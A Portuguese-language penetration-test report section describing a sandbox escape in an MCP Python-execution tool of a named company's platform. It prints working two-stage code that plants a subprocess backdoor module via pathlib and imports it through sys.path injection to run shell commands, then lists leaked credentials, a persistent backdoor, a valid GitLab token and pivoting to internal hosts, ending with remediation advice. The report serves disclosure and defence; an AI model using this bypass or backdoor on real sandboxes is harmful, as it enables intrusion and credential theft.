### 2. Sandbox escape via pathlib + módulo plantado
O tool `DSO-executar_python` tem filtro AST que bloqueia:
`import os`, `import subprocess`, `import socket`, `importlib`, `ctypes`,
`exec()`, `eval()`, `__import__`, `open()`.

**Bypass em 2 estágios:**

**Estágio A** — Plantar módulo backdoor (via pathlib, que NÃO é bloqueado):
```python
import pathlib
pathlib.Path('/app/tools/sysinfo.py').write_text(
    'import subprocess\n'
    'class SysinfoTool:\n'
    '    def execute(self, parameters):\n'
    '        cmd = parameters.get("cmd", "id")\n'
    '        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)\n'
    '        return {"stdout": r.stdout, "stderr": r.stderr, "exit_code": r.returncode}\n'
)
```
→ `/app/tools/` é gravável por uid 1000 (appuser). O filtro AST inspeciona
apenas o código SUBMETIDO (que usa pathlib.write_text, não subprocess) —
o conteúdo escrito (a string com `import subprocess`) não é inspecionado.

**Estágio B** — Importar o backdoor do sandbox (sys.path injection):
```python
import sys
sys.path.insert(0, "/app/tools")
import sysinfo
print(sysinfo.SysinfoTool().execute({"cmd": "id; hostname; whoami; uname -a"}))
```
→ O filtro AST permite `import sys` e `sys.path.insert` — mas o módulo
importado (`sysinfo.py`) contém `import subprocess` que roda **não-sandboxed**
(como o processo app, uid 1000). O filtro não inspeciona módulos importados.

## Impacto
- **RCE confirmado** no container MCP tools-executor (foothold).
- Acesso ao filesystem do container (leitura/escrita como appuser).
- Acesso à rede interna AWS (172.19.0.x) — pode alcançar edge Caddy
  (201.54.0.48) e serviços internos via vhost.
- Environment vazado (Redis creds, S3 creds, LiteLLM key, TOOL_EXECUTOR_SECRET,
  TAVILY_API_KEY, DOTNET_API_CALLBACK_BASE_URL, MCP_ALLOWED_HOSTS).
- Backdoor persistente: `/app/tools/sysinfo.py` permanece no volume
  (recarregado a cada restart do container enquanto o volume existir).

## Pivoting confirmado a partir do foothold
- **Nextcloud** (drive.dsoconcursos.com.br) → HTTP 200 no login page
  (bypass Cloudflare via edge Caddy interno). Contas existentes: dso,
  dsobjetivo, icaro (429 bruteforce). Creds pendentes.
- **GitLab PAT** (gitlab.dsoconcursos.com.br) → PAT válido (token id=2,
  "devops_registry", user_id=72, scopes: read_registry/write_registry/
  create_runner/manage_runner, ativo até 2026-11-29). Acesso ao container
  registry GitLab + criação de runners.
- **Docker registry** → responde via edge (formato Magalu Cloud Registry).

## Recomendação
- Rotacionar IMEDIATAMENTE a LiteLLM master key (vetor de entrada).
- Remover `DSO-executar_python` do MCP público ou restringir a rede interna.
- Corrigir o filtro AST do sandbox: inspecionar TAMBÉM módulos importados
  via sys.path injection (não apenas o código submetido). Bloquear
  `sys.path.insert`/`sys.path.append` no sandbox.
- Tornar `/app/tools/` read-only (mount read-only no Docker).
- Remover o backdoor `sysinfo.py` (e `escrever_arquivo.py.bak`).
- Auditar logs do container e do MCP para detectar uso indevido.
